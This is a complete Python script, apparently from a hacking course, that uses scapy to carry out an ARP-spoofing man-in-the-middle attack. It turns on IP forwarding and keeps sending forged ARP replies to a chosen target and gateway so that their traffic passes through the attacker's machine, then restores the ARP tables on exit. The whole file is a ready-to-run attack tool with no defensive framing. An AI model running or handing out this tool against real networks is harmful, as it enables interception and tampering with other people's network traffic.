#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import os        # for port forwarding
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target computer's IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP address")
    options = parser.parse_args()
    message = "\n\n[-] Please specify both a target IP address and a gateway IP address. Use --help for more info.\n"
    example = "\nExample: python arp_spoof.py -t 192.168.1.20 -g 192.168.1.1\n"
    if not options.target:
        parser.error(message + example)
    if not options.gateway:
        parser.error(message + example)
    return options



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")     # forwards packet so that target machine browser receives requests
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: %s" % sent_packets_count), # comment out this line for Python 3
        sys.stdout.flush()                                     # comment out this line for Python 3
        # if you are using Python 3, comment out the two lines above and uncomment the line below
        # print("\r[+] Packets sent: %s" % sent_packets_count, end="")   # uncomment this line for Python 3
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ....... Resetting ARP tables.......Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
